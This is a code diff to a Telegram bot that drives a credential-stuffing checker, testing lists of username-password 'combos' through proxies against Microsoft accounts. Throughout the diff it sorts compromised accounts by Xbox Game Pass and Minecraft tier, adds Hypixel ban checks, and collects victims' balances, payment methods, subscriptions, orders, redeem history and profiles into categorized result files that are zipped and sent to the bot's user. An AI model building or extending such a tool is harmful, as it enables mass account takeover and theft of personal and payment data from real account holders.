@@ -138,13 +138,24 @@ def register(app) -> None:
 
         def on_hit(capture):
             if notify_hits:
-                # Schedule a Telegram message from the worker thread
                 line = capture.builder()
+                atype = capture.account_type.upper()
+                if "ULTIMATE" in atype:
+                    icon, tier = "🎮", "XGPU"
+                elif "GAME PASS" in atype:
+                    icon, tier = "🟢", "XGP"
+                elif "NORMAL" in atype or "MINECRAFT" in atype:
+                    icon, tier = "💎", "Normal MC"
+                elif capture.is_msa_only():
+                    icon, tier = "🆔", "MSA Only"
+                else:
+                    icon, tier = "✨", capture.account_type
+
                 async def _send():
                     try:
                         await client.send_message(
                             user_id,
-                            f"🎯 <b>HIT!</b>\n<code>{line}</code>",
+                            f"{icon} <b>HIT — {tier}</b>\n<code>{line}</code>",
                         )
                     except Exception:
                         pass
@@ -153,13 +164,14 @@ def register(app) -> None:
         engine = CheckEngine(
             combos=combos, proxies=proxies, threads=threads,
             progress=progress, results=results, on_hit=on_hit,
+            hypixel_ban_check=SETTINGS.hypixel_ban_check,
         )
 
         async def progress_loop() -> None:
             interval = SETTINGS.progress_edit_interval
             while True:
                 await asyncio.sleep(interval)
-                snap = progress.snapshot()
+                snap, _ = progress.snapshot()
                 try:
                     await status_msg.edit_text(progress.render())
                 except Exception:
@@ -177,7 +189,7 @@ def register(app) -> None:
             except asyncio.CancelledError:
                 pass
 
-        snap = progress.snapshot()
+        snap, _ = progress.snapshot()
         db.add_stats(user_id, hits=snap.hits, bad=snap.bad,
                      twofa=snap.twofa, errors=snap.errors)
 
@@ -196,10 +208,14 @@ def register(app) -> None:
         if file_format == "zip":
             try:
                 zip_path = results.make_zip()
+                cap = (
+                    f"📦 Results · ✅ {snap.hits} hits "
+                    f"(XGPU {snap.xgpu} / XGP {snap.xgp} / "
+                    f"Normal {snap.normal} / MSA {snap.msa})\n"
+                    f"❌ {snap.bad} bad  •  ⚠️ {snap.twofa} 2fa  •  ⚡ {snap.errors} err"
+                )
                 await client.send_document(
-                    user_id, str(zip_path),
-                    caption=f"📦 Results · {snap.hits} hits / {snap.bad} bad "
-                            f"/ {snap.twofa} 2fa / {snap.errors} err",
+                    user_id, str(zip_path), caption=cap,
                 )
                 return
             except Exception:
@@ -214,9 +230,15 @@ def register(app) -> None:
             except Exception:
                 pass
         if result_type == "all":
-            for category in ("Capture", "MS_Balance", "MS_Points",
-                             "MS_Payments", "Hypixel_Capture", "Donut_Capture",
-                             "2fa", "Bad", "Errors"):
+            for category in (
+                "Capture", "XGPU", "XGP", "Normal", "MSA",
+                "MS_Balance", "MS_Points", "MS_Payments",
+                "MS_Subscriptions", "MS_RedeemHistory",
+                "MS_Orders", "MS_Profile", "Xbox_Profile",
+                "Hypixel_Capture", "Hypixel_Bans",
+                "Donut_Capture", "Donut_Bans",
+                "2fa", "Bad", "Errors",
+            ):
                 p = results.path_for(category)
                 if p.exists() and p.stat().st_size > 0:
                     try:
